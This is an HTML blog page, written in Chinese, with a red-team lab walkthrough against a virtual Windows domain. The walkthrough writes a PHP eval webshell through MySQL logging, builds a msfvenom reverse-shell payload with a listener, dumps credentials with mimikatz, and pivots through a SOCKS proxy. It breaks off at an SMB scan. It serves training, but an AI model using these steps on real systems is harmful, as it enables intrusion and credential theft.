@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ATT&amp;CK红队实战1网络拓扑   VM1对应Win7是Web服务器 VM2对应Windows2003是域成员 VM3对应Windows Server 2008是域控  环境配置win7网络适配器设置为自定义(VMnet1仅主机模式)，再添加一个网络适配器设置为NAT模式； Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK实战1">
+<meta property="og:url" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="ATT&amp;CK红队实战1网络拓扑   VM1对应Win7是Web服务器 VM2对应Windows2003是域成员 VM3对应Windows Server 2008是域控  环境配置win7网络适配器设置为自定义(VMnet1仅主机模式)，再添加一个网络适配器设置为NAT模式； Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；攻击">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902202910070.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902203443862.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902204843683.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205050531.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205141438.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205226874.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205554642.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205725364.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210034389.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210157543.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210431394.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210657747.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210813193.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211053001.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211251617.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211332342.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211428525.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211543704.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213251778.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213348423.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213716237.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213752921.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214000448.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214250464.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902215828517.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220036506.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220254471.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220345427.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220506323.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220909199.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221058933.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221223455.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223836406.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221519496.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902222609466.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223129932.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224311689.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224600219.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224752632.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224851076.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225059396.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225403015.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902232714728.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233120736.png">
+<meta property="og:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233256523.png">
+<meta property="article:published_time" content="2022-09-02T09:12:09.000Z">
+<meta property="article:modified_time" content="2022-09-02T15:51:16.946Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902202910070.png">
+
+
+<link rel="canonical" href="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/","path":"2022/09/02/ATT-CK实战1/","title":"ATT&CK实战1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK实战1 | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-amp-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%981"><span class="nav-number">1.</span> <span class="nav-text">ATT&amp;CK红队实战1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">外网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87phpmyadmin-getshell"><span class="nav-number">1.2.2.</span> <span class="nav-text">通过phpmyadmin getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.2.3.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="nav-number">1.3.</span> <span class="nav-text">进入内网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862"><span class="nav-number">1.3.1.</span> <span class="nav-text">信息收集2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%88%90%E5%91%98"><span class="nav-number">1.3.2.</span> <span class="nav-text">拿下域成员</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK实战1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-09-02 17:12:09 / Modified: 23:51:16" itemprop="dateCreated datePublished" datetime="2022-09-02T17:12:09+08:00">2022-09-02</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>3.4k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>3 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="ATT-amp-CK红队实战1"><a href="#ATT-amp-CK红队实战1" class="headerlink" title="ATT&amp;CK红队实战1"></a>ATT&amp;CK红队实战1</h1><p>网络拓扑</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902202910070.png" alt="image-20220902202910070"></p>
+<ul>
+<li>VM1对应<code>Win7</code>是Web服务器</li>
+<li>VM2对应<code>Windows2003</code>是域成员</li>
+<li>VM3对应<code>Windows Server 2008</code>是域控</li>
+</ul>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>win7网络适配器设置为自定义(VMnet1仅主机模式)，再添加一个网络适配器设置为NAT模式；</p>
+<p>Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；<br>攻击机kali设置为NAT模式；</p>
+<p>此时Win7、Windows2003、Windows Server 2008处于同一内网中，攻击机kali只能先拿下win7，再通过win7访问内网进行横向渗透；</p>
+<p>开启win7的phpstudy；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902203443862.png" alt="image-20220902203443862"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一下，找到win7的IP地址为:192.168.152.142</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902204843683.png" alt="image-20220902204843683"></p>
+<p>继续扫一下win7开放了哪些端口；<br><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205050531.png" alt="image-20220902205050531"></p>
+<p>访问80端口，是一个php探针页面，可以看到网站根目录绝对路径是<code>C:/phpStudy/WWW</code>；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205141438.png" alt="image-20220902205141438"></p>
+<p>扫描一下网站目录，有phpmyadmin目录；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205226874.png" alt="image-20220902205226874"></p>
+<h3 id="通过phpmyadmin-getshell"><a href="#通过phpmyadmin-getshell" class="headerlink" title="通过phpmyadmin getshell"></a>通过phpmyadmin getshell</h3><p>弱口令登录：root/root</p>
+<p>尝试用sql语句写文件，结果因为MySQL服务器使用–secure file priv选项运行，所以无法执行此语句；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205554642.png" alt="image-20220902205554642"></p>
+<p>试试看能不能通过日志文件来写shell，执行<code>show variables  like  &#39;%general%&#39;;</code>查看一下日志状态；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902205725364.png" alt="image-20220902205725364"></p>
+<p>日志功能是关闭的，开启后，执行过的sql语句都会保存到stu1.log，我们可以修改保存路径，存到我们指定的文件中；<br> 先开启日志功能<code>set global general_log=on;</code></p>
+<p>修改日志保存路径为<code>C:/phpStudy/WWW/shell.php</code>：<code>set global general_log_file=&#39;C:/phpStudy/WWW/shell.php&#39;</code></p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210034389.png" alt="image-20220902210034389"></p>
+<p>查询一句话木马<code>SELECT &#39;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#39;</code>，这样shell就成功写入shell.php了；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210157543.png" alt="image-20220902210157543"></p>
+<p>访问192.168.152.142/shell.php，蚁剑连接</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210431394.png" alt="image-20220902210431394"></p>
+<p>还有一种方式getshell，扫描目录的时候有个beifen.rar 是一个cms源码，访问yxcms，在公告栏看到了登录的账号密码</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210657747.png" alt="image-20220902210657747"></p>
+<p>登录后：</p>
+<p>在前台模板哪里写入shell</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902210813193.png" alt="image-20220902210813193"></p>
+<p>根据备份文件的目录结构，找到shell:</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.152.142/yxcms/protected/apps/default/view/default/shell.php">http://192.168.152.142/yxcms/protected/apps/default/view/default/shell.php</a></p>
+<p>蚁剑连接即可</p>
+<p>接下来看看有没有什么有用信息；<br> <code>whoami</code>一看是管理员账号；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211053001.png" alt="image-20220902211053001"></p>
+<p><code>ipconfig</code>发现还有另一个网段，可知内网网段为<code>192.168.52.x</code>；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211251617.png" alt="image-20220902211251617"></p>
+<p><code>net config Workstation</code>查看当前计算机名称，全名，用户名，以及所在的工作站域等信息；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211332342.png" alt="image-20220902211332342"></p>
+<p><code>net localgroup administrators</code>查看本地管理员，发现还有另一台用户；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211428525.png" alt="image-20220902211428525"></p>
+<p><code>systeminfo</code>查看系统信息，可以确定当前域为<code>god.org</code>，域服务器名称为<code>OWA</code>，并且还打了四个补丁；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902211543704.png" alt="image-20220902211543704"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>由于win7启动了安全模式，所以无法直接反弹shell到kali上；<br>通过msf生成一个木马<code>msf.exe</code>到win7上（-f 输出格式，-o 输出地址）；通过蚁剑上传</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.152.128 <span class="attribute">LPORT</span>=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>exploit/multi/handler</code>模块开启msf监听；</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.152.128 (kali IP)</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 4444 (</span>监听的端口<span class="comment">)</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213251778.png" alt="image-20220902213251778"></p>
+<p>接着<code>getuid</code>查看一下当前权限，然后<code>getsystem</code>提为system权限；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213348423.png" alt="image-20220902213348423"></p>
+<p>提权成功，发现没有开启3389端口，执行<code>run post/windows/manage/enable_rdp</code>开启3389端口；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213716237.png" alt="image-20220902213716237"></p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902213752921.png" alt="image-20220902213752921"></p>
+<p><code>rdesktop 192.168.2.133</code>连接成功；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214000448.png" alt="image-20220902214000448"></p>
+<p>使用meterpreter中mimikatz模块获取密码，现在已经是system权限，<code>load mimikatz</code>加载；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902214250464.png" alt="image-20220902214250464"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">creds<span class="emphasis">_msv    获取密码hash值</span></span><br><span class="line"><span class="emphasis">creds_</span>kerberos    获取密码明文</span><br></pre></td></tr></table></figure>
+
+<p>抓取失败，使用cs,生成exe 通过蚁剑上传</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902215828517.png" alt="image-20220902215828517"></p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220036506.png" alt="image-20220902220036506"></p>
+<p>获取system权限，Elevate</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220254471.png" alt="image-20220902220254471"></p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220345427.png" alt="image-20220902220345427"></p>
+<p>使用mimikatz：得到密码</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220506323.png" alt="image-20220902220506323"></p>
+<p>GOD\Administrator Qwer1234 登录成功</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902220909199.png" alt="image-20220902220909199"></p>
+<h2 id="进入内网"><a href="#进入内网" class="headerlink" title="进入内网"></a>进入内网</h2><h3 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h3><p><code>run post/windows/gather/enum_applications</code>查看win7上安装了哪些软件；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221058933.png" alt="image-20220902221058933"></p>
+<p><code>arp -a</code>查看路由表，可以看到另一个网段<code>192.168.52.0/24</code>，还有另外两台主机；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221223455.png" alt="image-20220902221223455"></p>
+<p><code>net group &quot;domain controllers&quot; /domain</code> 确认域控主机名字为OWA</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223836406.png" alt="image-20220902223836406"></p>
+<p><code>net view </code>得到域控ip为：192.168.52.138；域成员：192.168.52.141</p>
+<p><code>run autoroute -s 192.168.52.0/24</code>添加录路由；</p>
+<p><code>run autoroute -p</code>查看路由；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902221519496.png" alt="image-20220902221519496"></p>
+<p>设置代理，方便访问内网服务；</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="keyword">set</span> srvhost <span class="comment">192.168.152.128</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">srvport 1080</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">version 4a</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902222609466.png" alt="image-20220902222609466"></p>
+<p>然后修改<code>vim /etc/proxychains.conf</code>的最后一行为<code>socks4  192.168.152.128 1080</code>；</p>
+<p><code>proxychains curl http://192.168.52.143/</code>试一试能否访问内网IP；</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902223129932.png" alt="image-20220902223129932"></p>
+<p>能成功访问，接下来扫一下另外两台主机开启了哪些端口，使用auxiliary/scanner/portscan/tcp模块；</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">threads 100</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224311689.png" alt="image-20220902224311689"></p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224600219.png" alt="image-20220902224600219"></p>
+<p>可以看到两台主机都开了135、445端口，说明都有SMB服务；</p>
+<h3 id="拿下域成员"><a href="#拿下域成员" class="headerlink" title="拿下域成员"></a>拿下域成员</h3><p>使用<code>auxiliary/scanner/smb/smb_version</code>扫描系统版本，是Windows2003版本；</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="keyword">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
